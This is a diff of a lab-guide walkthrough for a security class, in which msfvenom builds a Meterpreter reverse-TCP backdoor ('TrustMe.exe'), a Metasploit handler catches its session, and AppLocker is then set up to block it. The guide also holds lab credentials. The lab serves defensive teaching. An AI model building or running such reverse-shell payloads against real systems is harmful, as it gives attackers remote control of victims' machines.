@@ -66,26 +66,15 @@ ssh ubuntu@linux.cloudlab.lan
 
 Let's start by getting root access in our terminal.
 
-<pre>sudo su -</pre>
+```bash
+sudo su -
+```
 
-We need to run the following command in order to mount our remote system to the correct directory:
+Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:
 
-<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
-
-**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
-
-If you see the following error, it means that the device is already mounted.
-
-![](attachments/mounterror.png)
-
-If this is the case, ignore it.
-Run the following command to navigate into the mounted directory:
-
-<pre>cd /mnt/windows-share</pre>
-
-Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:
-
-<pre>ifconfig</pre>
+```bash
+ifconfig
+```
 
 ![](attachments/applocker_ifconfig.png)
 
@@ -93,15 +82,32 @@ Before we run the next commands, we need to get the IP of our Kali System (AKA o
 
 Now, run the following commands to start a simple backdoor and backdoor listener: 
 
-<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+```bash
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe
+```
 
-Let's start the **Metasploit Handler**.  First, open a new **Kali** instance. The easiest way to do this is by clicking on the **Kali** icon in the taskbar.
+Let's start the **Metasploit Handler**.  First, open a new **Linux** instance.
 
-![](attachments/TaskbarKaliIcon.png)
+
+
+- Open **Command Prompt**
+
+<img width="85" height="103" alt="image" src="https://github.com/user-attachments/assets/b2c7dbad-d57b-40d0-9318-ca8d40176c22" />
+
+- **SSH** into the **Linux** machine
+```bash
+ssh ubuntu@linux.cloudlab.lan
+```
+
+<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />
+
+
 
 Before doing anything else, we need to run the following command in our new terminal window:
 
-<pre>msfconsole -q</pre>
+```bash
+msfconsole -q
+```
 
 ![](attachments/msfconsole.png)
 
@@ -109,19 +115,27 @@ The **Metasploit Handler** successfully ran if the terminal now starts with **"m
 
 Next, let's run the following:
 
-<pre>use exploit/multi/handler</pre>
+```bash
+use exploit/multi/handler
+```
 
 Now run all of the following commands to set the correct parameters:
 
-<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
 
-<pre>set LHOST [Your Linux IP Address]</pre>
+```bash
+set LHOST [Your Linux IP Address]
+```
 
 **REMEMBER - YOUR IP WILL LIKELY BE DIFFERENT!**
 
 Go ahead and run the exploit:
 
-<pre>exploit</pre>
+```bash
+exploit
+```
 
 It should look like this:
 
@@ -129,19 +143,35 @@ It should look like this:
 
 Let’s download the malware and run it!
 
-Open a **Windows** command prompt. Do this by clicking on the icon in the taskbar.
+Going back to our **Powershell** terminal, copy the file over from **Linux**
 
-![](attachments/OpeningWindowsCommandPrompt.png) 
+```ps
+cd .\Desktop\
+```
+
+```ps
+scp ubuntu@linux.cloudlab.lan:/home/ubuntu/Desktop/TrustMe.exe .
+```
+
+Open a **Windows** command prompt. 
+
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/86cb26ca-748a-4d29-9d5b-cdc31d22ca3a" />
 
 Once the prompt is open, let's run the following commands to run the **"TrustMe.exe"** file.
 
-<pre>cd \</pre>
+```cmd
+cd \Users\Administrator\Desktop
+```
+ 
+Then run it with the following:
 
-<pre>TrustMe.exe</pre>
+```cmd
+TrustMe.exe
+```
 
 ![](attachments/runtrustme.png)
 
-Back at your **Kali** terminal, you should now have a **metasploit** session!
+Back at your **Linux** terminal, you should now have a **metasploit** session!
 
 ![](attachments/meterpretersession.png)
 
@@ -191,17 +221,23 @@ Once the **"Application Identity Properties"** dialog is open, please press the 
 
 Open a command prompt and run **"gpupdate"** to force the policy change.
 
-![](attachments/OpeningWindowsCommandPrompt.png)
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/50e871b5-a3ec-4c55-92dd-db5fd4a1e1d4" />
 
-<pre>gpupdate /force</pre>
+```bash
+gpupdate /force
+```
 
 We are now going to try to run **"TrustMe.exe"** as another user on the system. 
 
 Run the following commands:
 
-<pre>cd /IntroLabs</pre>
+```cmd
+cd /IntroLabs
+```
 
-<pre>runas /user:whitelist "nc"</pre>
+```cmd
+runas /user:whitelist "nc"
+```
 
 The password is **adhd**
 
@@ -222,6 +258,7 @@ As you can see, an error was generated, meaning that we were successful!
 Please be sure to destroy the lab environment!
 
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
+
 
 
 
